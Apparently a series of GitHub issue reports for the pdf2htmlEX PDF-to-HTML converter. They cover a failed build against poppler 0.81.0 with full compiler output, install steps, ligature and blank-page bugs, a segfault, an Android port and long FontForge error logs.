   virtual GBool tilingPatternFill(GfxState * /*state*/, Gfx * /*gfx*/, Catalog * /*cat*/, Object * /*str*/,
                 ^~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:168:8: warning:   by ‘bool CairoOutputDev::tilingPatternFill(GfxState*, Gfx*, Catalog*, Object*, const double*, int, int, Dict*, const double*, const double*, int, int, int, int, double, double)’ [-Woverloaded-virtual]
   bool tilingPatternFill(GfxState *state, Gfx *gfx, Catalog *cat, Object *str,
        ^~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:250:16: warning: ‘virtual void OutputDev::beginString(GfxState*, GooString*)’ was hidden [-Woverloaded-virtual]
   virtual void beginString(GfxState * /*state*/, GooString * /*s*/) {}
                ^~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:190:8: warning:   by ‘void CairoOutputDev::beginString(GfxState*, const GooString*)’ [-Woverloaded-virtual]
   void beginString(GfxState *state, const GooString *s) override;
        ^~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:274:16: warning: ‘virtual void OutputDev::beginActualText(GfxState*, GooString*)’ was hidden [-Woverloaded-virtual]
   virtual void beginActualText(GfxState * /*state*/, GooString * /*text*/ ) {}
                ^~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:196:8: warning:   by ‘void CairoOutputDev::beginActualText(GfxState*, const GooString*)’ [-Woverloaded-virtual]
   void beginActualText(GfxState *state, const GooString *text) override;
        ^~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:336:16: warning: ‘virtual void OutputDev::beginTransparencyGroup(GfxState*, double*, GfxColorSpace*, GBool, GBool, GBool)’ was hidden [-Woverloaded-virtual]
   virtual void beginTransparencyGroup(GfxState * /*state*/, double * /*bbox*/,
                ^~~~~~~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:243:8: warning:   by ‘void CairoOutputDev::beginTransparencyGroup(GfxState*, const double*, GfxColorSpace*, bool, bool, bool)’ [-Woverloaded-virtual]
   void beginTransparencyGroup(GfxState * /*state*/, const double * /*bbox*/,
        ^~~~~~~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:341:16: warning: ‘virtual void OutputDev::paintTransparencyGroup(GfxState*, double*)’ was hidden [-Woverloaded-virtual]
   virtual void paintTransparencyGroup(GfxState * /*state*/, double * /*bbox*/) {}
                ^~~~~~~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:249:8: warning:   by ‘void CairoOutputDev::paintTransparencyGroup(GfxState*, const double*)’ [-Woverloaded-virtual]
   void paintTransparencyGroup(GfxState * /*state*/, const double * /*bbox*/) override;
        ^~~~~~~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:342:16: warning: ‘virtual void OutputDev::setSoftMask(GfxState*, double*, GBool, Function*, GfxColor*)’ was hidden [-Woverloaded-virtual]
   virtual void setSoftMask(GfxState * /*state*/, double * /*bbox*/, GBool /*alpha*/,
                ^~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:250:8: warning:   by ‘void CairoOutputDev::setSoftMask(GfxState*, const double*, bool, Function*, GfxColor*)’ [-Woverloaded-virtual]
   void setSoftMask(GfxState * /*state*/, const double * /*bbox*/, bool /*alpha*/,
        ^~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:427:8: error: ‘void CairoImageOutputDev::setDefaultCTM(const double*)’ marked ‘override’, but does not override
   void setDefaultCTM(const double *ctm) override { }
        ^~~~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:450:8: error: ‘bool CairoImageOutputDev::tilingPatternFill(GfxState*, Gfx*, Catalog*, Object*, const double*, int, int, Dict*, const double*, const double*, int, int, int, int, double, double)’ marked ‘override’, but does not override
   bool tilingPatternFill(GfxState *state, Gfx *gfx, Catalog *cat, Object *str,
        ^~~~~~~~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:495:8: error: ‘void CairoImageOutputDev::beginTransparencyGroup(GfxState*, const double*, GfxColorSpace*, bool, bool, bool)’ marked ‘override’, but does not override
   void beginTransparencyGroup(GfxState * /*state*/, const double * /*bbox*/,
        ^~~~~~~~~~~~~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:500:8: error: ‘void CairoImageOutputDev::paintTransparencyGroup(GfxState*, const double*)’ marked ‘override’, but does not override
   void paintTransparencyGroup(GfxState * /*state*/, const double * /*bbox*/) override {}
        ^~~~~~~~~~~~~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:501:8: error: ‘void CairoImageOutputDev::setSoftMask(GfxState*, const double*, bool, Function*, GfxColor*)’ marked ‘override’, but does not override
   void setSoftMask(GfxState * /*state*/, const double * /*bbox*/, bool /*alpha*/,
        ^~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:131:16: warning: ‘virtual void OutputDev::setDefaultCTM(double*)’ was hidden [-Woverloaded-virtual]
   virtual void setDefaultCTM(double *ctm);
                ^~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:427:8: warning:   by ‘void CairoImageOutputDev::setDefaultCTM(const double*)’ [-Woverloaded-virtual]
   void setDefaultCTM(const double *ctm) override { }
        ^~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:220:17: warning: ‘virtual GBool OutputDev::tilingPatternFill(GfxState*, Gfx*, Catalog*, Object*, double*, int, int, Dict*, double*, double*, int, int, int, int, double, double)’ was hidden [-Woverloaded-virtual]
   virtual GBool tilingPatternFill(GfxState * /*state*/, Gfx * /*gfx*/, Catalog * /*cat*/, Object * /*str*/,
                 ^~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:450:8: warning:   by ‘bool CairoImageOutputDev::tilingPatternFill(GfxState*, Gfx*, Catalog*, Object*, const double*, int, int, Dict*, const double*, const double*, int, int, int, int, double, double)’ [-Woverloaded-virtual]
   bool tilingPatternFill(GfxState *state, Gfx *gfx, Catalog *cat, Object *str,
        ^~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:336:16: warning: ‘virtual void OutputDev::beginTransparencyGroup(GfxState*, double*, GfxColorSpace*, GBool, GBool, GBool)’ was hidden [-Woverloaded-virtual]
   virtual void beginTransparencyGroup(GfxState * /*state*/, double * /*bbox*/,
                ^~~~~~~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:495:8: warning:   by ‘void CairoImageOutputDev::beginTransparencyGroup(GfxState*, const double*, GfxColorSpace*, bool, bool, bool)’ [-Woverloaded-virtual]
   void beginTransparencyGroup(GfxState * /*state*/, const double * /*bbox*/,
        ^~~~~~~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:341:16: warning: ‘virtual void OutputDev::paintTransparencyGroup(GfxState*, double*)’ was hidden [-Woverloaded-virtual]
   virtual void paintTransparencyGroup(GfxState * /*state*/, double * /*bbox*/) {}
                ^~~~~~~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:500:8: warning:   by ‘void CairoImageOutputDev::paintTransparencyGroup(GfxState*, const double*)’ [-Woverloaded-virtual]
   void paintTransparencyGroup(GfxState * /*state*/, const double * /*bbox*/) override {}
        ^~~~~~~~~~~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:342:16: warning: ‘virtual void OutputDev::setSoftMask(GfxState*, double*, GBool, Function*, GfxColor*)’ was hidden [-Woverloaded-virtual]
   virtual void setSoftMask(GfxState * /*state*/, double * /*bbox*/, GBool /*alpha*/,
                ^~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:501:8: warning:   by ‘void CairoImageOutputDev::setSoftMask(GfxState*, const double*, bool, Function*, GfxColor*)’ [-Woverloaded-virtual]
   void setSoftMask(GfxState * /*state*/, const double * /*bbox*/, bool /*alpha*/,
        ^~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc: In member function ‘virtual bool CairoFont::matches(Ref&, bool)’:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:83:17: error: no match for ‘operator==’ (operand types are ‘Ref’ and ‘Ref’)
   return (other == ref);
           ~~~~~~^~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc: In static member function ‘static CairoFreeTypeFont* CairoFreeTypeFont::create(GfxFont*, XRef*, FT_Library, bool)’:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:420:47: error: ‘class GooString’ has no member named ‘c_str’
      gfxFont->getName() ? gfxFont->getName()->c_str()
                                               ^~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:439:27: error: ‘class GooString’ has no member named ‘c_str’
     fileNameC = fileName->c_str();
                           ^~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:488:42: error: invalid conversion from ‘const char*’ to ‘char*’ [-fpermissive]
         ff = FoFiTrueType::load(fileNameC);
                                          ^
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:45:0:
/usr/local/include/poppler/fofi/FoFiTrueType.h:54:24: note:   initializing argument 1 of ‘static FoFiTrueType* FoFiTrueType::load(char*, int)’
   static FoFiTrueType *load(char *fileName, int faceIndexA=0);
                        ^~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:502:40: error: invalid conversion from ‘const char*’ to ‘char*’ [-fpermissive]
       ff = FoFiTrueType::load(fileNameC);
                                        ^
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:45:0:
/usr/local/include/poppler/fofi/FoFiTrueType.h:54:24: note:   initializing argument 1 of ‘static FoFiTrueType* FoFiTrueType::load(char*, int)’
   static FoFiTrueType *load(char *fileName, int faceIndexA=0);
                        ^~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:531:42: error: invalid conversion from ‘const char*’ to ‘char*’ [-fpermissive]
         ff1c = FoFiType1C::load(fileNameC);
                                          ^
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:46:0:
/usr/local/include/poppler/fofi/FoFiType1C.h:154:22: note:   initializing argument 1 of ‘static FoFiType1C* FoFiType1C::load(char*)’
   static FoFiType1C *load(char *fileName);
                      ^~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:563:37: error: invalid conversion from ‘const char*’ to ‘char*’ [-fpermissive]
    ff = FoFiTrueType::load(fileNameC);
                                     ^
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:45:0:
/usr/local/include/poppler/fofi/FoFiTrueType.h:54:24: note:   initializing argument 1 of ‘static FoFiTrueType* FoFiTrueType::load(char*, int)’
   static FoFiTrueType *load(char *fileName, int faceIndexA=0);
                        ^~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc: In member function ‘virtual bool CairoType3Font::matches(Ref&, bool)’:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:786:17: error: no match for ‘operator==’ (operand types are ‘Ref’ and ‘Ref’)
   return (other == ref && printing == printingA);
           ~~~~~~^~~~~~
CMakeFiles/pdf2htmlEX.dir/build.make:62: recipe for target 'CMakeFiles/pdf2htmlEX.dir/3rdparty/poppler/git/CairoFontEngine.cc.o' failed
make[2]: *** [CMakeFiles/pdf2htmlEX.dir/3rdparty/poppler/git/CairoFontEngine.cc.o] Error 1
CMakeFiles/Makefile2:355: recipe for target 'CMakeFiles/pdf2htmlEX.dir/all' failed
make[1]: *** [CMakeFiles/pdf2htmlEX.dir/all] Error 2
Makefile:140: recipe for target 'all' failed
make: *** [all] Error 2


```


Here is how I installed dependant libraries:

```
sudo apt-get install -y libpng16-16 libpng-dev libjpeg8 libjpeg8-dev libopenjp2-7-dev

sudo apt-get install -y build-essential checkinstall git cmake m4 pkg-config libopenjp2-7-dev libopenjp2-7 \
libgdk-pixbuf2.0-dev fontconfig libpoppler-dev libpoppler-private-dev \
libfontconfig1-dev libfontforge-dev poppler-data poppler-utils libcairo2-dev libfontforge-dev libpango1.0-dev



cd /tmp
wget https://poppler.freedesktop.org/poppler-0.81.0.tar.xz && tar -xvf poppler-0.81.0.tar.xz
cd poppler-0.81.0
sudo cmake -DENABLE_XPDF_HEADERS=ON .
sudo make -j 4 && sudo make install

sudo pkg-config --libs poppler

cd /tmp
git clone https://github.com/pdf2htmlEX/pdf2htmlEX.git
export INCLUDE_PATH=$INCLUDE_PATH:/usr/local/include/poppler/
cd pdf2htmlEX
cmake .
make -j4
sudo make install
```

Any idea on how to solve the issue?

Thanks Installing pdf2htmlEX via Homebrew on macOS still pulls in the old upstream fork. I'd suggest raising a PR asking for a switch to this repo instead. If the brew admins don't like that, can try making a new package. 

https://github.com/Homebrew/homebrew-core/blob/master/Formula/pdf2htmlex.rb Seems that the code uses deprecated CCITTFaxStream methods. Could someone tell me which version is used? Hi! I tried to convert the following PDF with "--decompose-ligature 1" parameter but still got "ﬂ" etc.:
https://www.pnas.org/content/pnas/107/Supplement_2/8902.full.pdf
Check for example "Whereas clades reﬂect" I expected "reflect".

Any help appreciated, thanks!

pdf2htmlEX version 0.15.0
Libraries:
  poppler 0.63.0
  libfontforge 20190418
  cairo 1.17.3 Hi, 
Can this project  be compiled to get a .exe version that will run in windows?

We have a windows running version, but have stumbled into issueas and are looking for the latest version of this tool, that might have fixes for what we have.
Issues we are getting are:
- no glyph for the key character to derive standard width and height
for the latin script, this key character is 'o'

- To Unicode cmap is not valid and got dropped for font

- encoding confliction detected in font ERROR: Could not find a version that satisfies the requirement pdf2htmlex (from versions: none)
ERROR: No matching distribution found for pdf2htmlex Hello. Sorry if this is not an appropriate place to do that but I'm not experienced web-developer and I'd like to ask for help and guidance:
I'd like to be able to process the html output by pdf2htmlEX in such a way that certain (but not known before running the program) phrases are highlighted. So I'd figured that I should:
* parse the html with BeautifulSoup in Python,
* extract the `id="page-container"` div,
* glue the text fields into a plain text on the side without losing information which text-bite came form which div, and figure out which divs need to be highlighted,
* place a modified version of the `id="page-container"` div back into the original html.

Would you say that this makes sense? Is there some functionality in pdf2htmlEX which could make my task easier and which I seem to be missing? Some sort of sentence-extractor for example?
Many thanks! Hi all,

I have a PDF file https://secufiles.com/awP7/Grammar_and_Vocabulary_for_Advanced.pdf

When I use pdf2htmlEx 0.18.7 (poppler 0.81.0, libfontforge 20170924, cairo 1.15.12) to generate a HTML version, what I receive is a HTML file that includes all white/empty pages.

I think that the CSS class "fc0" caused it.

Is there any idea to fix this issue?


Regards

Dinh I find the size of the font files very large, how to  patch fontforge to prevent it writing the current time into the dumped fonts? Hello,

I have ported this program into Android as a library.
Link: https://github.com/ViliusSutkus89/pdf2htmlEX-Android

The library use case might be useful for other platforms too.
[My implementation](https://github.com/ViliusSutkus89/pdf2htmlEX-Android/blob/ebfc8f40edf50c5dff54caad00765a548e89f38c/pdf2htmlEX/src/main/cpp/pdf2htmlEX.cc#L87) is based on stuffing parameters into ```char  **``` and passing them to pdf2htmlEX's ```int main()```.

Was there any prior work on libpdf2htmlEX?
What interface should be exposed? pdf2htmlEX version 0.18.7, installed on Debian Stretch with poppler 0.81.0 compiled.

I'm receiving "segmentation fault" when I try to process a PDF file:

```
me@server:~$ pdf2htmlEX --version
pdf2htmlEX version 0.18.7
Copyright 2012-2015 Lu Wang <coolwanglu@gmail.com> and other contributors
Libraries: 
  poppler 0.81.0
  libfontforge 20190114
  cairo 1.14.8
Default data-dir: /usr/share/pdf2htmlEX
Supported image format: png jpg svg

me@server:~$ pdf2htmlEX --embed cfijo --fit-width 1024 --bg-format jpg --split-page 1 --dest-dir /tmp/test/ file.pdf 
Preprocessing: 44/44
Segmentation fault
``` [The building wiki is a bit out of date it seems](https://github.com/pdf2htmlEX/pdf2htmlEX/wiki/Building).

The new compiler options for poppler's xpdf are `-DENABLE_UNSTABLE_API_ABI_HEADERS=ON`, instead of '--enable-xpdf-headers`.

Not sure which version of poppler made the change, and it isn't in the `INSTALL` file provided by them.  But is found by grepping their cmake options:

```
> egrep '^ *(option|set.*STRING)' CMakeLists.txt
option(ENABLE_UNSTABLE_API_ABI_HEADERS "Install API/ABI unstable xpdf headers." OFF)
...
``` Hello, 

I am stuck on processing a pdf file.
I am getting these kind of warnings:
- No glyph for the key character to derive standard width and height
for the latin script, this key character is 'o'
- To Unicode cmap is not valid and got dropped for font
- Encoding confliction detected in font

I have included on command line: --tounicode 1 and/or call to ttfautohint
How can I get past this issue?

Html text, looks like this: 
Electrical System - Alternator
Electrical System - Alternator

  
 
  
 
 I'm trying to convert a simple PDF file like [this](http://www.xmlpdf.com/manualfiles/hello-world.pdfl) on windows 64-bit 7 machine but it result in the below error. My guess it's missing some font on the machine, but I'm unsure nor do know which one.

> Preprocessing: 0/4
> Preprocessing: 1/4
> Preprocessing: 2/4
> Preprocessing: 3/4
> Preprocessing: 4/4
> Working: 0/4
> Internal Error: Attempt to output 2147483647 into a 16-bit field. It will be truncated and the file may not be useful.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Arabic lookup 1 subtable in 'mark' Mark Positioning in Arabic lookup 1, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Arabic lookup 2 subtable in 'mark' Mark Positioning in Arabic lookup 2, contains no data.
> Internal Error: Lookup sub table, 'mkmk' Mark to Mark in Arabic lookup 3 subtable in 'mkmk' Mark to Mark in Arabic lookup 3, contains no data.
> Internal Error: Lookup sub table, 'mkmk' Mark to Mark in Arabic lookup 4 subtable in 'mkmk' Mark to Mark in Arabic lookup 4, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning lookup 5 subtable in 'mark' Mark Positioning lookup 5, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning lookup 6 subtable in 'mark' Mark Positioning lookup 6, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning lookup 7 subtable in 'mark' Mark Positioning lookup 7, contains no data.
> Internal Error: Lookup sub table, Mark to base attachment lookup 8 subtable in Mark to base attachment lookup 8, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning lookup 9 subtable in 'mark' Mark Positioning lookup 9, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning lookup 10 subtable in 'mark' Mark Positioning lookup 10, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning lookup 11 subtable in 'mark' Mark Positioning lookup 11, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning lookup 12 subtable in 'mark' Mark Positioning lookup 12, contains no data.
> Internal Error: Lookup sub table, Mark to base attachment lookup 13 subtable in Mark to base attachment lookup 13, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning lookup 14 subtable in 'mark' Mark Positioning lookup 14, contains no data.
> Internal Error: Lookup sub table, 'mkmk' Mark to Mark lookup 15 subtable in 'mkmk' Mark to Mark lookup 15, contains no data.
> Internal Error: Lookup sub table, 'mkmk' Mark to Mark lookup 16 subtable in 'mkmk' Mark to Mark lookup 16, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 17 subtable in 'mark' Mark Positioning in Hebrew lookup 17, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 18 subtable in 'mark' Mark Positioning in Hebrew lookup 18, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 19 subtable in 'mark' Mark Positioning in Hebrew lookup 19, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 20 subtable in 'mark' Mark Positioning in Hebrew lookup 20, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 21 subtable in 'mark' Mark Positioning in Hebrew lookup 21, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 22 subtable in 'mark' Mark Positioning in Hebrew lookup 22, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 23 contextual 0 in 'mark' Mark Positioning in Hebrew lookup 23, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 23 contextual 1 in 'mark' Mark Positioning in Hebrew lookup 23, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 23 contextual 2 in 'mark' Mark Positioning in Hebrew lookup 23, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 23 contextual 3 in 'mark' Mark Positioning in Hebrew lookup 23, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 24 contextual 0 in 'mark' Mark Positioning in Hebrew lookup 24, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 24 contextual 1 in 'mark' Mark Positioning in Hebrew lookup 24, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 24 contextual 2 in 'mark' Mark Positioning in Hebrew lookup 24, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 24 contextual 3 in 'mark' Mark Positioning in Hebrew lookup 24, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 25 contextual 0 in 'mark' Mark Positioning in Hebrew lookup 25, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 25 contextual 1 in 'mark' Mark Positioning in Hebrew lookup 25, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 25 contextual 2 in 'mark' Mark Positioning in Hebrew lookup 25, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 25 contextual 3 in 'mark' Mark Positioning in Hebrew lookup 25, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 26 contextual 0 in 'mark' Mark Positioning in Hebrew lookup 26, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 26 contextual 1 in 'mark' Mark Positioning in Hebrew lookup 26, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 26 contextual 2 in 'mark' Mark Positioning in Hebrew lookup 26, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 26 contextual 3 in 'mark' Mark Positioning in Hebrew lookup 26, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 27 subtable in 'mark' Mark Positioning in Hebrew lookup 27, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 28 subtable in 'mark' Mark Positioning in Hebrew lookup 28, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 29 subtable in 'mark' Mark Positioning in Hebrew lookup 29, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 30 contextual 0 in 'mark' Mark Positioning in Hebrew lookup 30, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 30 contextual 1 in 'mark' Mark Positioning in Hebrew lookup 30, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 30 contextual 2 in 'mark' Mark Positioning in Hebrew lookup 30, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 30 contextual 3 in 'mark' Mark Positioning in Hebrew lookup 30, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 30 contextual 4 in 'mark' Mark Positioning in Hebrew lookup 30, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 30 contextual 5 in 'mark' Mark Positioning in Hebrew lookup 30, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 30 contextual 6 in 'mark' Mark Positioning in Hebrew lookup 30, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 30 contextual 7 in 'mark' Mark Positioning in Hebrew lookup 30, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 0 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 1 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 2 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 3 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 4 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 5 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 6 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 7 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 8 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 9 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 10 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 11 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 31 contextual 12 in 'mark' Mark Positioning in Hebrew lookup 31, contains no data.
> Internal Error: Lookup sub table, 'mark' Mark Positioning in Hebrew lookup 32 subtable in 'mark' Mark Positioning in Hebrew lookup 32, contains no data.
> Internal Error: Lookup sub table, Single Positioning lookup 33 subtable in Single Positioning lookup 33, contains no data.
> Internal Error: Lookup sub table, Mark to base attachment lookup 34 subtable in Mark to base attachment lookup 34, contains no data.
